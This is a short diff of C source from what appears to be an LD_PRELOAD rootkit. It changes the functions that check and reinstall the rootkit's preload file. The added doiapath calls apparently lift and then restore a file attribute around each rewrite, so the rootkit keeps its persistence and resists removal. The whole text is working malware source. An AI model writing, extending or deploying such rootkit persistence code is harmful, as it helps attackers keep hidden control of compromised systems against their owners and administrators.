@@ -13,7 +13,11 @@ int _preloadok(const char *preloadpath, char *installdir, char *bdvlso){ // retu
         status = 0;
     free(sopath);
 
-    if(status != 0) chown_path(preloadpath, readgid());
+    if(status != 0){
+        doiapath(preloadpath, 0);
+        chown_path(preloadpath, readgid());
+        doiapath(preloadpath, 1);
+    }
     return status;
 }
 
@@ -28,6 +32,8 @@ void reinstall(const char *preloadpath, char *installdir, char *bdvlso){
     char *sopath = rksopath(installdir, bdvlso);
     if(!sopath) return;
 
+    doiapath(preloadpath, 0);
+
     hook(CFOPEN, CFWRITE);
     FILE *ldfp = call(CFOPEN, preloadpath, "w");
 
@@ -38,4 +44,5 @@ void reinstall(const char *preloadpath, char *installdir, char *bdvlso){
         chown_path(preloadpath, readgid());
     }
     free(sopath);
+    doiapath(preloadpath, 1);
 }
